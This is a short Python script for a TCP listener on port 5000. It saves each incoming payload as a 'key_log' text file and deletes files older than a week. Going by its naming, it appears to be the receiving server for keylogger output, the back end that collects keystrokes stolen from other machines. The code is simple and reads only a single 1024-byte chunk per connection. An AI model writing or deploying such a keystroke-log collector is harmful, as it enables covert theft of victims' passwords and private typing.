import os
import time
import socket

# Define the IP address and port to listen on
listen_ip = '0.0.0.0'  # listen on all available network interfaces
listen_port = 5000  # choose a port number

# Define the folder to store the received files
received_files_folder = 'received_files/'

# Create the folder if it doesn't exist
os.makedirs(received_files_folder, exist_ok=True)

# Define a function to receive a file and store it in the folder
def receive_file():
    # Create a socket object and start listening for incoming connections
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((listen_ip, listen_port))
    s.listen(1)

    # Accept the connection from the sender
    conn, addr = s.accept()

    # Receive the file contents and store them in a file
    file_contents = conn.recv(1024).decode('utf-8')
    file_path = os.path.join(received_files_folder, f'key_log_{time.time()}.txt')
    with open(file_path, 'w') as f:
        f.write(file_contents)

    # Close the connection and socket
    conn.close()
    s.close()

    # Delete files in the folder that are more than 7 days old
    for filename in os.listdir(received_files_folder):
        file_path = os.path.join(received_files_folder, filename)
        if os.stat(file_path).st_mtime < time.time() - 7 * 24 * 60 * 60:
            os.remove(file_path)

# Continuously listen for incoming connections and receive files
while True:
    receive_file()
